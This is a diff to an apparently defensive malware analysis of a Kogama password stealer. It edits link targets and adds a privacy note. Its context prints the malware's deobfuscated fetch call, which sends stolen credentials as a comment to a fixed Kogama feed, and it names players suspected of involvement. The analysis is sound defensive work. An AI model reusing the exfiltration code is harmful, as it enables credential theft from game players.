@@ -66,7 +66,7 @@ function _0x22fc() {
 2. **Data Exfiltration**
    - Transmits stolen credentials as a "comment" to a fixed Kogama.com feed ID
    - You can view the current state of comments from this object [here](https://www.kogama.com/api/feed/31872096/comment/)
-   - If you want to go a few steps ahead, you can compare your findings to what I've saved @ [May 31, 2025 20:24](https://github.com/vendicatedcore/kgmmlwr/blob/main/Inversion/Script/endpoint/comments.json)
+   - If you want to go a few steps ahead, you can compare your findings to what I've saved @ [May 31, 2025 20:24]([https://github.com/vendicatedcore/kgmmlwr/blob/main/Inversion/Script/endpoint/comments.json](https://github.com/vendicatedcore/kgmmlwr/blob/main/Inversion/Script/Data/Comments.json))
 ```javascript
 fetch('https://www.kogama.com/api/feed/31872096/comment/', {
   'method': _0x5acfe3(0x1f3),  // Resolves to 'POST'
@@ -78,7 +78,7 @@ fetch('https://www.kogama.com/api/feed/31872096/comment/', {
   })
 ```
 
-As of [May 31, 2025 20:24](https://github.com/vendicatedcore/kgmmlwr/blob/main/Inversion/Script/endpoint/comments.json) the only accounts that have posted any comments under this specific Object are ~~GameCodeMaster~~ and a dummy account @ [Boris Jacob Anderson](https://www.kogama.com/profile/670351929/). Both of those have already changed passwords which could mean two twings. 
+As of [May 31, 2025 20:24]([https://github.com/vendicatedcore/kgmmlwr/blob/main/Inversion/Script/endpoint/comments.json](https://github.com/vendicatedcore/kgmmlwr/blob/main/Inversion/Script/Data/Comments.json)) the only accounts that have posted any comments under this specific Object are ~~GameCodeMaster~~ and a dummy account @ [Boris Jacob Anderson](https://www.kogama.com/profile/670351929/). Both of those have already changed passwords which could mean two twings. 
 ~~Either the person behind this script is GameCodeMaster simply testing their own sample, or that account has been stolen because of their naive traits.
 Why such theory? GameCodeMaster is an owner of 'Tester' Badge, which these days - isn't rare, but it just may be an indicator.~~
 
@@ -151,3 +151,6 @@ Two additional parties involved in this operation, who engaged in harassment and
 The primary threat actor has been actively distributing password-stealer malware through comments on the profile of '[G0D_B3RN13](https://www.kogama.com/profile/669867874/)'.
 
 > ![Malware Distribution Evidence](https://github.com/user-attachments/assets/d009bf9d-c8cf-4da1-8c85-5e248c954596)
+
+
+**Due to privacy reasons, I'm unable to provide more screenshots.**
